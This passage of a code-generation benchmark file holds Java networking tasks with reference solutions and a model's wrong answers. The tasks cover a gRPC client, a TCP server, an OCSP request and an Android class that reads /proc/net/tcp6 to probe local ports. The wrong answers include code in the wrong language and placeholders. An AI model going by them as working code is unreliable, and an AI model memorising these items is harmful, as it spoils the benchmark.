AbstractBlockingStub - Gets or creates a blocking stub instance\n- getStub() -> AbstractStub - Gets or creates an async stub instance\n- createStub() -> AbstractStub - Abstract method to be implemented for creating async stubs\n- createBlockingStub() -> AbstractBlockingStub - Abstract method to be implemented for creating blocking stubs\n- resetStub() -> String - Resets the connection and finds the current leader host\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) -> RespT - Makes a blocking unary RPC call with default retries\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) -> RespT - Makes a blocking unary RPC call with specified retries\n- concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) -> KVPair<Boolean, RespT> - Makes concurrent calls to multiple hosts\n- streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) -> void - Makes a server streaming call\n- close() -> void - Closes all active channels and cleans up resources\n- closeChannel(ManagedChannel channel) -> void - Helper method to safely close a channel",
    "Canonical_solution": "import java.io.Closeable;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Predicate;\nimport java.util.stream.Stream;\n\nimport org.apache.hugegraph.pd.common.KVPair;\nimport org.apache.hugegraph.pd.common.PDException;\nimport org.apache.hugegraph.pd.grpc.PDGrpc;\nimport org.apache.hugegraph.pd.grpc.PDGrpc.PDBlockingStub;\nimport org.apache.hugegraph.pd.grpc.Pdpb;\n\nimport io.grpc.Channel;\nimport io.grpc.ClientCall;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.AbstractBlockingStub;\nimport io.grpc.stub.AbstractStub;\nimport io.grpc.stub.ClientCalls;\nimport io.grpc.stub.StreamObserver;\nimport lombok.extern.slf4j.Slf4j;\n\n@Slf4j\npublic abstract class AbstractClient implements Closeable {\n\n    private static final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected ManagedChannel channel = null;\n    protected volatile ConcurrentMap<String, AbstractBlockingStub> stubs = null;\n\n    protected AbstractClient(PDConfig config) {\n        String[] hosts = config.getServerHost().split(\",\");\n        this.stubProxy = new AbstractClientStubProxy(hosts);\n        this.config = config;\n    }\n\n    protected AbstractBlockingStub getBlockingStub() throws PDException {\n        if (stubProxy.getBlockingStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getBlockingStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return (AbstractBlockingStub) stubProxy.getBlockingStub()\n                                               .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                  TimeUnit.MILLISECONDS);\n    }\n\n    protected AbstractStub getStub() throws PDException {\n        if (stubProxy.getStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return stubProxy.getStub();\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    private String resetStub() {\n        String leaderHost = \"\";\n        for (int i = 0; i < stubProxy.getHostCount(); i++) {\n            String host = stubProxy.nextHost();\n            channel = ManagedChannelBuilder.forTarget(host).usePlaintext().build();\n            PDBlockingStub blockingStub = PDGrpc.newBlockingStub(channel)\n                                                .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                   TimeUnit.MILLISECONDS);\n            try {\n                GetMembersRequest request = Pdpb.GetMembersRequest.newBuilder()\n                                                                  .setHeader(header).build();\n                GetMembersResponse members = blockingStub.getMembers(request);\n                Metapb.Member leader = members.getLeader();\n                leaderHost = leader.getGrpcUrl();\n                close();\n                channel = ManagedChannelBuilder.forTarget(leaderHost).usePlaintext().build();\n                stubProxy.setBlockingStub(createBlockingStub());\n                stubProxy.setStub(createStub());\n                log.info(\"PDClient connect to host = {} success\", leaderHost);\n                break;\n            } catch (Exception e) {\n                log.error(\"PDClient connect to {} exception {}, {}\", host, e.getMessage(),\n                          e.getCause() != null ? e.getCause().getMessage() : \"\");\n            }\n        }\n        return leaderHost;\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req) throws PDException {\n        return blockingUnaryCall(method, req, 5);\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) throws PDException {\n        AbstractBlockingStub stub = getBlockingStub();\n        try {\n            RespT resp =\n                    ClientCalls.blockingUnaryCall(stub.getChannel(), method, stub.getCallOptions(),\n                                                  req);\n            return resp;\n        } catch (Exception e) {\n            log.error(method.getFullMethodName() + \" exception, {}\", e.getMessage());\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setBlockingStub(null);\n                    }\n                    return blockingUnaryCall(method, req, ++retry);\n                }\n            }\n        }\n        return null;\n    }\n\n    protected <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        LinkedList<String> hostList = this.stubProxy.getHostList();\n        if (this.stubs == null) {\n            synchronized (this) {\n                if (this.stubs == null) {\n                    this.stubs = new ConcurrentHashMap<>(hostList.size());\n                }\n            }\n        }\n        Stream<RespT> respTStream = hostList.parallelStream().map((address) -> {\n            AbstractBlockingStub stub = getConcurrentBlockingStub(address);\n            RespT resp = ClientCalls.blockingUnaryCall(stub.getChannel(),\n                                                       method, stub.getCallOptions(), req);\n            return resp;\n        });\n        KVPair<Boolean, RespT> pair;\n        AtomicReference<RespT> response = new AtomicReference<>();\n        boolean result = respTStream.anyMatch((r) -> {\n            response.set(r);\n            return predicate.test(r);\n        });\n        if (result) {\n            pair = new KVPair<>(true, null);\n        } else {\n            pair = new KVPair<>(false, response.get());\n        }\n        return pair;\n    }\n\n    protected <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request,\n                                               StreamObserver<RespT> responseObserver,\n                                               int retry) throws PDException {\n        AbstractStub stub = getStub();\n        try {\n            ClientCall<ReqT, RespT> call = stub.getChannel().newCall(method, stub.getCallOptions());\n            ClientCalls.asyncServerStreamingCall(call, request, responseObserver);\n        } catch (Exception e) {\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setStub(null);\n                    }\n                    streamingCall(method, request, responseObserver, ++retry);\n                    return;\n                }\n            }\n            log.error(\"rpc call with exception, {}\", e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() {\n        closeChannel(channel);\n        if (stubs != null) {\n            for (AbstractBlockingStub stub : stubs.values()) {\n                closeChannel((ManagedChannel) stub.getChannel());\n            }\n        }\n    }\n\n    private void closeChannel(ManagedChannel channel) {\n        try {\n            while (channel != null &&\n                   !channel.shutdownNow().awaitTermination(100, TimeUnit.MILLISECONDS)) {\n                continue;\n            }\n        } catch (Exception e) {\n            log.info(\"Close channel with error : \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.stub.AbstractBlockingStub;\nimport io.grpc.stub.AbstractStub;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic abstract class AbstractClient {\n    protected final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected volatile ManagedChannel channel;\n    protected final ConcurrentMap<String, AbstractBlockingStub> stubs = new ConcurrentHashMap<>();\n\n    public AbstractClient(PDConfig config) {\n        this.config = config;\n        this.stubProxy = new AbstractClientStubProxy();\n    }\n\n    public AbstractBlockingStub getBlockingStub() {\n        String host = config.getHost();\n        return stubs.computeIfAbsent(host, key -> createBlockingStub());\n    }\n\n    public AbstractStub getStub() {\n        String host = config.getHost();\n        return stubProxy.getStub(host, this::createStub);\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    public String resetStub() {\n        String leaderHost = findLeaderHost();\n        if (leaderHost != null && !leaderHost.equals(config.getHost())) {\n            config.setHost(leaderHost);\n            closeChannel(channel);\n            channel = null;\n            stubs.clear();\n        }\n        return leaderHost;\n    }\n\n    public <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) {\n        return blockingUnaryCall(method, req, 3);\n    }\n\n    public <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) {\n        for (int i = 0; i < retry; i++) {\n            try {\n                return getBlockingStub().blockingUnaryCall(method, req);\n            } catch (Exception e) {\n                if (i == retry - 1) {\n                    throw e;\n                }\n                resetStub();\n            }\n        }\n        throw new RuntimeException(\"Failed to make blocking unary call after retries\");\n    }\n\n    public <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        return stubProxy.concurrentBlockingUnaryCall(this::getBlockingStub, method, req, predicate);\n    }\n\n    public <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) {\n        for (int i = 0; i < retry; i++) {\n            try {\n                getStub().streamingCall(method, request, responseObserver);\n                return;\n            } catch (Exception e) {\n                if (i == retry - 1) {\n                    throw e;\n                }\n                resetStub();\n            }\n        }\n    }\n\n    public void close() {\n        chs.values().forEach(this::closeChannel);\n        chs.clear();\n        stubs.clear();\n        closeChannel(channel);\n    }\n\n    protected void closeChannel(ManagedChannel channel) {\n        if (channel != null && !channel.isShutdown()) {\n            channel.shutdownNow();\n        }\n    }\n\n    protected String findLeaderHost() {\n        return \"leader-host\"; // Placeholder implementation\n    }\n}\n```"
  },
  {
    "Task_id": 504,
    "Instruction": "Task Description: Implement a function to test the gRPC Server Reflection service by establishing a connection to a gRPC server, sending a reflection request, and processing the response.\n\nFunction Description: The function connects to a gRPC server running on localhost at port 9090 using plaintext communication. It creates an asynchronous stub for the Server Reflection service, sends a request to list all available services, and processes the response. The function ensures proper cleanup by shutting down the channel after completion.\n\nInput: None (The target server address is hardcoded as \"localhost:9090\")\n\nOutput: None (The function processes the reflection response internally via the checkResult method, which is not shown in the reference code)",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc.ServerReflectionStub;\nimport io.grpc.reflection.v1alpha.ServerReflectionRequest;\nimport io.grpc.reflection.v1alpha.ServerReflectionResponse;\nimport io.grpc.stub.StreamObserver;\n\nvoid testReflectionService() {\n    final ManagedChannel channel = ManagedChannelBuilder.forTarget(\"localhost:9090\").usePlaintext().build();\n    try {\n        final ServerReflectionStub stub = ServerReflectionGrpc.newStub(channel);\n\n        final AwaitableStreamObserver<ServerReflectionResponse> resultObserver = new AwaitableStreamObserver<>();\n        final StreamObserver<ServerReflectionRequest> requestObserver = stub.serverReflectionInfo(resultObserver);\n        requestObserver.onNext(ServerReflectionRequest.newBuilder()\n                .setListServices(\"\")\n                .build());\n        requestObserver.onCompleted();\n        checkResult(resultObserver);\n    } finally {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 23,
    "wrong_result": "```python\nimport asyncio\nimport grpc\nfrom grpc_reflection.v1alpha import reflection\n\nasync def test_grpc_reflection():\n    channel = grpc.aio.insecure_channel('localhost:9090')\n    stub = reflection.ReflectionStub(channel)\n    request = reflection.ListServicesRequest()\n    response = await stub.ListServices(request)\n    await channel.close()\n    checkResult(response)\n\ndef checkResult(response):\n    pass\n```"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create a function to test if a given URL is reachable by making an HTTP GET request and verifying the response code.\n\nFunction Description: The function attempts to connect to a specified URL using an HTTP GET request. It checks if the response code is HTTP_OK (200) to determine if the URL is reachable. The connection is properly closed after the check.\n\nInput: \n- strUrl: String - The URL to be tested for reachability\n\nOutput: \n- None (The function throws an exception if the URL is unreachable or if the response code is not HTTP_OK)",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic void testUrlReachable(String strUtl) throws Exception {\n    URL url = new URL(strUtl);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    conn.setRequestMethod(\"GET\");\n    conn.connect();\n    int rc = conn.getResponseCode();\n    assertEquals(HttpURLConnection.HTTP_OK, rc);\n    conn.disconnect();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "def test_url_reachability(strUrl):\n    import urllib.request\n    try:\n        with urllib.request.urlopen(strUrl) as response:\n            if response.getcode() != 200:\n                raise Exception(\"URL is unreachable or returned non-200 status code\")\n    except Exception as e:\n        raise e"
  },
  {
    "Task_id": 516,
    "Instruction": "Task Description: Implement a TCP server class that handles multiple client connections simultaneously, providing predefined chat responses to incoming messages.\n\nClass Description: TCPServer is a Java class that creates a TCP server listening on a specified port. It maintains a set of predefined messages and can handle multiple client connections concurrently, responding with random messages from its predefined set. The server can be started and stopped as needed.\n\nAttributes:\n- mIsServiceDestoryed: boolean - Flag indicating whether the server should stop running\n- mDefinedMessages: String[] - Array of predefined messages to send to clients\n\nMethods:\n- startServer() -> void - Starts the TCP server in a new thread\n- stopServer() -> void - Stops the TCP server by setting the termination flag\n- TcpServer (inner class) run() -> void - Main server loop that accepts client connections (implements Runnable)\n- responseClient(Socket client) -> void - Handles communication with an individual client\n  - Input: client: Socket - The client socket connection\n  - Output: (none) - Sends responses to client through the socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPServer {\n\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = new String[] {\n            \"\u4f60\u597d\u554a\uff0c\u54c8\u54c8\",\n            \"\u8bf7\u95ee\u4f60\u53eb\u4ec0\u4e48\u540d\u5b57\u5440\uff1f\",\n            \"\u4eca\u5929\u5317\u4eac\u5929\u6c14\u4e0d\u9519\u554a\uff0cshy\",\n            \"\u4f60\u77e5\u9053\u5417\uff1f\u6211\u53ef\u662f\u53ef\u4ee5\u548c\u591a\u4e2a\u4eba\u540c\u65f6\u804a\u5929\u7684\u54e6\",\n            \"\u7ed9\u4f60\u8bb2\u4e2a\u7b11\u8bdd\u5427\uff1a\u636e\u8bf4\u7231\u7b11\u7684\u4eba\u8fd0\u6c14\u4e0d\u4f1a\u592a\u5dee\uff0c\u4e0d\u77e5\u9053\u771f\u5047\u3002\"\n    };\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            ServerSocket serverSocket = null;\n            try {\n                serverSocket = new ServerSocket(8688);\n            } catch (IOException e) {\n                System.err.println(\"establish tcp server failed, port:8688\");\n                e.printStackTrace();\n                return;\n            }\n\n            while (!mIsServiceDestoryed) {\n                try {\n                    final Socket client = serverSocket.accept();\n                    System.out.println(\"accept\");\n                    new Thread() {\n                        @Override\n                        public void run() {\n                            try {\n                                responseClient(client);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        };\n                    }.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(\n                client.getInputStream()));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(client.getOutputStream())), true);\n        out.println(\"\u6b22\u8fce\u6765\u5230\u804a\u5929\u5ba4\uff01\");\n        while (!mIsServiceDestoryed) {\n            String str = in.readLine();\n            System.out.println(\"msg from client:\" + str);\n            if (str == null) {\n                break;\n            }\n            int i = new Random().nextInt(mDefinedMessages.length);\n            String msg = mDefinedMessages[i];\n            out.println(msg);\n            System.out.println(\"send :\" + msg);\n        }\n        System.out.println(\"client quit.\");\n        out.close();\n        in.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPServer {\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = {\"Hello!\", \"How can I assist you?\", \"Nice to meet you.\", \"What's on your mind?\", \"I'm here to help.\"};\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(12345)) {\n                System.out.println(\"Server is listening on port 12345...\");\n                while (!mIsServiceDestoryed) {\n                    Socket client = serverSocket.accept();\n                    System.out.println(\"New client connected\");\n                    new Thread(() -> responseClient(client)).start();\n                }\n            } catch (IOException e) {\n                if (!mIsServiceDestoryed) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n             PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(\"Received: \" + inputLine);\n                String response = mDefinedMessages[new Random().nextInt(mDefinedMessages.length)];\n                out.println(response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create a function that sends an OCSP (Online Certificate Status Protocol) request to a specified URL and processes the response.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends an OCSP request, reads the response, and constructs an OCSPResp object from the received data. It handles the connection lifecycle and ensures proper resource cleanup.\n\nInput:\n- url: [String] - The URL to which the OCSP request will be sent\n- ocspReq: [OCSPReq] - The OCSP request object containing the encoded request data\n\nOutput:\n- [OCSPResp] - The OCSP response object constructed from the server's response data\n- Throws [IOException] - If any I/O error occurs during the request/response process",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.apache.commons.io.IOUtils;\n\nprivate OCSPResp requestOCSPResponse(String url, OCSPReq ocspReq) throws IOException {\n    byte[] ocspReqData = ocspReq.getEncoded();\n\n    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n    try {\n        con.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        con.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setUseCaches(false);\n        try (OutputStream out = con.getOutputStream()) {\n            IOUtils.write(ocspReqData, out);\n            out.flush();\n        }\n        byte[] responseBytes = IOUtils.toByteArray(con.getInputStream());\n        OCSPResp ocspResp = new OCSPResp(responseBytes);\n        return ocspResp;\n    } finally {\n        if (con != null) {\n            con.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport sun.security.x509.CertificateSerialNumber;\nimport sun.security.x509.X509CertImpl;\nimport sun.security.ocsp.OCSPResp;\nimport sun.security.ocsp.OCSPReq;\n\npublic class OCSPClient {\n    public static OCSPResp sendOCSPRequest(String url, OCSPReq ocspReq) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        connection.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n\n        byte[] requestBytes = ocspReq.getEncoded();\n        connection.getOutputStream().write(requestBytes);\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"HTTP request failed with code: \" + responseCode);\n        }\n\n        try (InputStream inputStream = connection.getInputStream()) {\n            byte[] responseBytes = inputStream.readAllBytes();\n            return new OCSPResp(responseBytes);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 520,
    "Instruction": "Here is the structured instruction for the class-level reference code:\n\nTask Description: Implement a class that facilitates TCP socket communication between a server and client on the local machine, using a secret string for verification and callback notifications.\n\nClass Description: The `SocketCommunication` class establishes a TCP server that listens for incoming connections and a client that probes open ports. When the client finds a matching server using a secret string, it triggers a callback notification.\n\nAttributes:\n- TAG: String - A tag used for logging purposes\n- secret: String - The secret string used for verification between client and server\n- callback: VirtualCheckCallback - A callback interface to notify when a suspect is found\n- portList: ArrayList<Integer> - A list of ports to probe for server connections\n\nMethods:\n- checkByPortListening(String, VirtualCheckCallback) -> void - Initiates the client and server threads for communication\n- startServer(String, VirtualCheckCallback) -> void - Creates a server socket that listens for incoming connections and spawns read threads\n- startClient(String) -> void - Scans for open ports and spawns client threads to probe them\n- ServerThread(String, VirtualCheckCallback) -> void - A thread class that runs the server socket\n- ReadThread(String, Socket, VirtualCheckCallback) -> void - A thread class that reads incoming data from a socket connection\n- ClientThread(String, int) -> void - A thread class that attempts to connect to a server socket and send the secret string",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.BindException;\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class SocketCommunication {\n    private String TAG = \"SocketCommunication\";\n    \n    public void checkByPortListening(String secret, VirtualCheckCallback callback) {\n        startClient(secret);\n        new ServerThread(secret, callback).start();\n    }\n\n    private class ServerThread extends Thread {\n        String secret;\n        VirtualCheckCallback callback;\n\n        private ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            startServer(secret, callback);\n        }\n    }\n\n    private void startServer(String secret, VirtualCheckCallback callback) {\n        Random random = new Random();\n        ServerSocket serverSocket = null;\n        try {\n            serverSocket = new ServerSocket();\n            serverSocket.bind(new InetSocketAddress(\"127.0.0.1\",\n                    random.nextInt(55534) + 10000));\n            while (true) {\n                Socket socket = serverSocket.accept();\n                ReadThread readThread = new ReadThread(secret, socket, callback);\n                readThread.start();\n            }\n        } catch (BindException e) {\n            startServer(secret, callback);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ReadThread extends Thread {\n        private ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            InputStream inputStream = null;\n            try {\n                inputStream = socket.getInputStream();\n                byte buffer[] = new byte[1024 * 4];\n                int temp = 0;\n                while ((temp = inputStream.read(buffer)) != -1) {\n                    String result = new String(buffer, 0, temp);\n                    if (result.contains(secret) && callback != null)\n                        callback.findSuspect();\n                }\n                inputStream.close();\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void startClient(String secret) {\n        String tcp6 = CommandUtil.getSingleInstance().exec(\"cat /proc/net/tcp6\");\n        if (TextUtils.isEmpty(tcp6)) return;\n        String[] lines = tcp6.split(\"\\n\");\n        ArrayList<Integer> portList = new ArrayList<>();\n        for (int i = 0, len = lines.length; i < len; i++) {\n            int localHost = lines[i].indexOf(\"0100007F:\");\n            if (localHost < 0) continue;\n            String singlePort = lines[i].substring(localHost + 9, localHost + 13);\n            Integer port = Integer.parseInt(singlePort, 16);\n            portList.add(port);\n        }\n        if (portList.isEmpty()) return;\n        for (int port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    private class ClientThread extends Thread {\n        String secret;\n        int port;\n\n        private ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            try {\n                Socket socket = new Socket(\"127.0.0.1\", port);\n                socket.setSoTimeout(2000);\n                OutputStream outputStream = socket.getOutputStream();\n                outputStream.write((secret + \"\\n\").getBytes(\"utf-8\"));\n                outputStream.flush();\n                socket.shutdownOutput();\n\n                InputStream inputStream = socket.getInputStream();\n                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n                String info = null;\n                while ((info = bufferedReader.readLine()) != null) {\n                    Log.i(TAG, \"ClientThread: \" + info);\n                }\n\n                bufferedReader.close();\n                inputStream.close();\n                socket.close();\n            } catch (ConnectException e) {\n                Log.i(TAG, port + \"port refused\");\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (UnknownHostException e) {\n                e.printStackTrace();\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\nclass SocketCommunication {\n    String TAG;\n    String secret;\n    VirtualCheckCallback callback;\n    ArrayList<Integer> portList;\n\n    public SocketCommunication(String tag, String secret, VirtualCheckCallback callback, ArrayList<Integer> portList) {\n        this.TAG = tag;\n        this.secret = secret;\n        this.callback = callback;\n        this.portList = portList;\n    }\n\n    public void checkByPortListening(String secret, VirtualCheckCallback callback) {\n        Thread serverThread = new Thread(() -> startServer(secret, callback));\n        Thread clientThread = new Thread(() -> startClient(secret));\n        serverThread.start();\n        clientThread.start();\n    }\n\n    public void startServer(String secret, VirtualCheckCallback callback) {\n        try (ServerSocket serverSocket = new ServerSocket(0)) {\n            int port = serverSocket.getLocalPort();\n            System.out.println(TAG + \" Server started on port: \" + port);\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ReadThread(secret, socket, callback).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startClient(String secret) {\n        for (int port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    class ServerThread extends Thread {\n        String secret;\n        VirtualCheckCallback callback;\n\n        public ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(0)) {\n                int port = serverSocket.getLocalPort();\n                System.out.println(TAG + \" Server started on port: \" + port);\n                while (true) {\n                    Socket socket = serverSocket.accept();\n                    new ReadThread(secret, socket, callback).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    class ReadThread extends Thread {\n        String secret;\n        Socket socket;\n        VirtualCheckCallback callback;\n\n        public ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.socket = socket;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.equals(secret)) {\n                        callback.onSuspectFound();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    class ClientThread extends Thread {\n        String secret;\n        int port;\n\n        public ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            try (Socket socket = new Socket(\"localhost\", port)) {\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                out.println(secret);\n            } catch (IOException e) {\n                // Port not open\n            }\n        }\n    }\n}\n\ninterface VirtualCheckCallback {\n    void onSuspectFound();\n}\n```"
  },
  {
    "Task_id": 522,
    "Instruction": "Task Description: Implement a Java class that acts as an HTTP proxy cache server, handling incoming client connections, processing requests, and managing cached resources. The server should be able to handle multiple concurrent connections efficiently.\n\nClass Description: HttpProxyCacheServer is a TCP server that listens for incoming HTTP requests, processes them through a caching mechanism, and returns the appropriate responses. It manages client connections in a thread-safe manner and maintains a cache of resources.\n\nAttributes:\n\nclientsLock: [Object] - Synchronization object for thread-safe access to clients map\nsocketProcessor: [ExecutorService] - Thread pool for processing socket connections\nclientsMap: [Map<String, HttpProxyCacheServerClients>] - Thread-safe map of URL to client handlers\nserverSocket: [ServerSocket] - Main server socket listening for connections\nport: [int] - Port number the server is listening on\nwaitConnectionThread: [Thread] - Thread that waits for incoming connections\nconfig: [Config] - Server configuration object\n\nMethods:\n\nHttpProxyCacheServer: [Constructor]([Context context]) -> [void] - Initializes the server with default configuration\nHttpProxyCacheServer: [Constructor]([Config config]) -> [void] - Initializes the server with custom configuration\nwaitForRequest: [void]() -> [void] - Continuously 